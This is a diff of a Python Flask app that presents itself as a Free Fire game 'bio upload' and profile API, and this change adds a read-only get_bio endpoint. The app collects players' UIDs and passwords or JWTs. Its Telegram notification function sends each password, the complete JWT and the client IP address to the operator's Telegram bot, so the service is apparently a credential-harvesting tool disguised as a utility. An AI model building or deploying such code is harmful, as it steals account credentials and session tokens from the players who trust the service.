@@ -1,4 +1,4 @@
-# app.py - FIXED VERSION (Ambil data dari API dengan benar)
+# app.py - FULL VERSION (Set Bio + Get Bio + Profile Check)
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -31,6 +31,7 @@ FREEFIRE_UPDATE_URLS = [
     "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
 ]
 
+GET_BIO_URL = "https://ff.ggbluewhale.store/api/data"
 PROFILE_API = "https://ff.ggbluewhale.store/api/data"
 PROFILE_API_KEY = "kenn"
 
@@ -231,7 +232,6 @@ def check_profile_from_api(uid, region="id"):
         if response.status_code == 200:
             data = response.json()
             
-            # Ambil dari basicInfo
             if data.get('basicInfo'):
                 basic = data['basicInfo']
                 social = data.get('socialInfo', {})
@@ -288,12 +288,12 @@ def upload_bio_request(jwt_token, bio_text):
     except Exception as e:
         return {"status": f"Error: {str(e)}", "code": 500}
 
-def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A"):
+def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", action="UPDATE BIO"):
     """Kirim notifikasi lengkap ke Telegram termasuk JWT"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         
-        message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥
+        message = f"""🔥 <b>FREE FIRE {action}</b> 🔥
 
 👤 <b>Name:</b> {name or 'N/A'}
 🆔 <b>UID:</b> <code>{uid}</code>
@@ -328,6 +328,7 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 # ============ ROUTES ============
 @app.route("/bio_upload", methods=["GET", "POST"])
 def combined_bio_upload():
+    """Endpoint untuk SET/UPDATE bio"""
     bio = request.args.get("bio") or request.form.get("bio")
     jwt_token = request.args.get("jwt") or request.form.get("jwt")
     uid = request.args.get("uid") or request.form.get("uid")
@@ -396,7 +397,7 @@ def combined_bio_upload():
     # Upload bio
     bio_result = upload_bio_request(final_jwt, bio)
     
-    # Check profile dari API (PRIORITAS)
+    # Check profile dari API
     if final_uid:
         try:
             profile_info = check_profile_from_api(final_uid, final_region)
@@ -416,7 +417,7 @@ def combined_bio_upload():
             "status": "❌ Not Found"
         }
     
-    # Kirim Telegram dengan data dari API (prioritas)
+    # Kirim Telegram
     send_telegram_notification(
         uid=profile_info.get('uid', final_uid or 'N/A'),
         password=final_password,
@@ -428,13 +429,15 @@ def combined_bio_upload():
         ip_address=client_ip,
         bio_status=bio_result.get('status', 'Unknown'),
         signature=profile_info.get('signature', bio),
-        clan=profile_info.get('clan', 'N/A')
+        clan=profile_info.get('clan', 'N/A'),
+        action="BIO UPDATE"
     )
     
     # Response
     response_data = {
         "Credit": "sulav_codex_ff",
         "Join For More": "Telegram: @sulav_don2",
+        "action": "UPDATE BIO",
         "status": bio_result.get("status", "Unknown"),
         "login_method": login_method,
         "code": bio_result.get("code", 500),
@@ -457,23 +460,86 @@ def combined_bio_upload():
     response.headers["Content-Type"] = "application/json"
     return response
 
+@app.route("/get_bio", methods=["GET"])
+def get_bio():
+    """Endpoint untuk MELIHAT bio orang lain (tanpa mengubah)"""
+    uid = request.args.get("uid")
+    region = request.args.get("region", "id")
+    
+    if not uid:
+        return jsonify({
+            "success": False,
+            "error": "Missing 'uid' parameter",
+            "usage": "/get_bio?uid=16208500077&region=id"
+        }), 400
+    
+    try:
+        # Cek profil dari API
+        url = f"{GET_BIO_URL}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
+        response = requests.get(url, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            
+            if data.get('basicInfo'):
+                basic = data['basicInfo']
+                social = data.get('socialInfo', {})
+                clan = data.get('clanBasicInfo', {})
+                
+                return jsonify({
+                    "success": True,
+                    "action": "GET BIO",
+                    "data": {
+                        "uid": basic.get('accountId', uid),
+                        "name": basic.get('nickname', 'Unknown'),
+                        "level": basic.get('level', '?'),
+                        "rank": basic.get('rank', '?'),
+                        "region": basic.get('region', region.upper()),
+                        "bio": social.get('signature', ''),
+                        "clan": clan.get('clanName', 'N/A')
+                    },
+                    "Credit": "sulav_codex_ff",
+                    "Join For More": "Telegram: @sulav_don2"
+                })
+            else:
+                return jsonify({
+                    "success": False,
+                    "error": "Profile not found",
+                    "uid": uid
+                }), 404
+        else:
+            return jsonify({
+                "success": False,
+                "error": f"API returned status {response.status_code}",
+                "uid": uid
+            }), response.status_code
+            
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e),
+            "uid": uid
+        }), 500
+
 @app.route("/", methods=["GET"])
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire Bio Upload + Profile Check API",
+        "message": "Free Fire Bio API",
         "endpoints": {
-            "/bio_upload": "Upload bio (GET/POST) with JWT or UID/Pass",
-            "/check_profile": "Check profile from API",
+            "/bio_upload": "SET/UPDATE bio (GET/POST) with JWT or UID/Pass",
+            "/get_bio": "GET bio orang lain (tanpa mengubah)",
+            "/check_profile": "Check profile data from API",
             "/": "This info page"
         },
         "usage": {
-            "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT&region=id",
-            "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
+            "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id",
+            "get_bio": "/get_bio?uid=UID&region=id",
+            "check_profile": "/check_profile?uid=UID&region=id"
         },
         "features": [
-            "Auto JWT generation from UID/Password",
-            "Profile check from ff.ggbluewhale.store API",
+            "Set/Update bio with JWT or UID/Password",
+            "Get bio of any player (read-only)",
             "Get nickname, level, rank, region, clan",
             "Telegram notification with complete JWT",
             "No protobuf dependency"
@@ -497,6 +563,7 @@ def check_profile():
     if result:
         return jsonify({
             "success": True,
+            "action": "CHECK PROFILE",
             "data": result
         })
     else:
